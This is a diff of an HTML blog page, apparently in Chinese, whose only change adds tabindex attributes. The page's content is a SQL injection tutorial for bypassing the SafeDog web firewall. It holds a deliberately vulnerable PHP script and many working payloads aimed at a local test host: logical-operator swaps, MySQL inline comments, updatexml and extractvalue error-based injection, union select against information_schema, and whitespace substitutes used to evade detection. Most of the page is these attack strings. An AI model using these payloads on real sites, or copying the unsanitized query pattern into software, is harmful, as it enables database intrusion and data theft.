@@ -75,7 +75,7 @@
 <p>本地测试代码(PHP):</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -88,7 +88,7 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
 <span class="nv">$con</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$con</span><span class="p">){</span><span class="k">die</span><span class="p">(</span><span class="s1">&#39;Could not connect: &#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());}</span>
 <span class="nx">mysql_select_db</span><span class="p">(</span><span class="s2">&#34;dvwa&#34;</span><span class="p">,</span> <span class="nv">$con</span><span class="p">);</span>
@@ -105,16 +105,16 @@
 <p>首先先稍微测试一番,发现存在安全狗</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1  and 1=1%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1  and 1=1%23
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -124,7 +124,7 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">and  1	拦截
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">and  1	拦截
 and  &#39;1&#39;    拦截  
 and  a	不拦截 
 and  &#39;a&#39;    拦截  
@@ -143,12 +143,12 @@ and  hex(1)  不拦截
 <p>针对第一种我们可以去看看运算符号 随便找到几个| ^ xor &amp; / * &amp;&amp; || 等等还有很多</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">与运算 a &amp; b  , 
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">与运算 a &amp; b  , 
 或运算 a | b ,  
 异或运算 a ^ b
 </code></pre></td></tr></table>
@@ -156,24 +156,24 @@ and  hex(1)  不拦截
 </div><p>那么可以试着将and替换成&amp;&amp;,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
 http://127.0.0.1/test.php?id=1&#39;   ||(1) %23 		//使用括号代替空格绕过
 //异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）
 http://127.0.0.1/test.php?id=1&#39;  xor 1%23			
@@ -184,10 +184,10 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 <p>判断查询字段,使用mysql的<code>/*!*/</code>内敛注释去绕过防护,而其中的代码是可以正常执行的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
@@ -199,10 +199,10 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 <p>在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
@@ -214,21 +214,21 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>基于报错信息的注入绕安全狗</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
 http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23
 </code></pre></td></tr></table>
 </div>
@@ -236,47 +236,47 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 <p>使用大括号去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>使用反引号去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
 </code></pre></td></tr></table>
 </div>
 </div><p>使用\N去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
 </code></pre></td></tr></table>
 </div>
 </div><p>括号法去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
 </code></pre></td></tr></table>
 </div>
 </div><p>也可以组合起来</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="cm">/*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="cm">/*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
 </span></code></pre></td></tr></table>
 </div>
 </div><p>这些都是去掉空格的合法语句,当然如果不拦截<code>/*/或/!*/</code>的话,也可以尝试这两个</p>
@@ -287,10 +287,10 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 php+mysql环境下支持的空格有：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
 </code></pre></td></tr></table>
 </div>
 </div><p>其中使用的最多的就是<code>%0a,%0b,%a0,/**/</code>，这四个当作空格插入在语句中来扰乱waf检测。
